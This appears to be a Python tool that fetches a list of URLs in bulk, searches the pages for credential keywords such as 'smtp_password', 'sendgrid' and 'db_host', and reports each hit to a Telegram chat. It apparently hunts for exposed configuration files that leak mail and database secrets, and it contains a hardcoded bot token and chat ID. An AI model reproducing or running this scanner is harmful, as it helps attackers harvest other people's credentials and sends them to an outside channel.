import httpx
import time
import asyncio

API_TOKEN = "7198969197:AAF6W3QO8b3H--2SlokRZ_meV6zjCzRySXQ"
URL = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
CHAT_ID = "6184226708"

KEYWORDS = {"mailgun", "sendgrid", "smtp_password", "db_host"}

async def send_telegram_message(text):
    data = {
        "chat_id": CHAT_ID,
        "text": text
    }
    async with httpx.AsyncClient() as client:
        response = await client.post(URL, json=data)
        if response.status_code != 200:
            print(f"Failed to send message: {response.status_code} - {response.text}")

async def send_request(url):
    try:
        start_time = time.time()
        async with httpx.AsyncClient(timeout=10) as client:
            response = await client.get(url)
            end_time = time.time()
            text = response.text.lower()
            found_keywords = [keyword for keyword in KEYWORDS if keyword in text]
            if found_keywords:
                await send_telegram_message(f"Keywords {found_keywords} found at URL: {url}, Time taken: {end_time - start_time} seconds")
    except httpx.RequestError as e:
        pass  # Ignore connection errors or timeouts
    except Exception as e:
        print("Error occurred while processing URL:", url, "Error:", str(e))

async def fetch_all(urls):
    tasks = [send_request(url) for url in urls]
    await asyncio.gather(*tasks)

def main():
    urls = []
    with open("ready_urls.txt", "r") as file:
        urls = [line.strip() for line in file]

    asyncio.run(fetch_all(urls))

if __name__ == "__main__":
    start_total_time = time.time()
    main()
    end_total_time = time.time()
    print("Total time taken:", end_total_time - start_total_time, "seconds")